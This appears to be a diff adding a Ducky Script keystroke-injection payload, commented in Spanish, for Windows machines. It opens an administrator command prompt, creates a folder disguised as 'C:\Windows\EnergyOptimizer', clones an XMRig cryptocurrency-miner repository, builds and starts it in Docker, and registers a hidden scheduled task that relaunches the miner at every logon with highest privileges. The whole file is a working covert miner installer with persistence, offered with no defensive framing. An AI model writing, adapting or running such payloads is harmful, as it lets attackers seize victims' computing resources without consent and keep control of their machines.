@@ -1,0 +1,44 @@
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 1500
+LEFT
+ENTER
+DELAY 2000
+
+REM Crear directorio y navegar
+STRING mkdir C:\Windows\EnergyOptimizer
+ENTER
+STRING cd C:\Windows\EnergyOptimizer
+ENTER
+
+REM Clonar repositorio
+STRING git clone http://github.com/anarcoiris/xmrig
+ENTER
+DELAY 2000
+
+REM Entrar en el repositorio clonado
+STRING cd xmrig
+ENTER
+DELAY 100
+
+REM Construir custom
+STRING docker build -t xmrig-custom .
+ENTER
+DELAY 5000
+
+REM Construir e iniciar contenedor
+STRING docker compose up --build -d
+ENTER
+DELAY 3000
+
+REM Crear tarea programada para iniciar en segundo plano al inicio
+STRING schtasks /create /tn "XMRigAutoStart" /tr "cmd /c cd C:\Windows\EnergyOptimizer\xmrig && docker compose up -d" /sc onlogon /rl highest /f
+ENTER
+DELAY 1000 
+
+REM Cerrar consola
+STRING exit
+ENTER
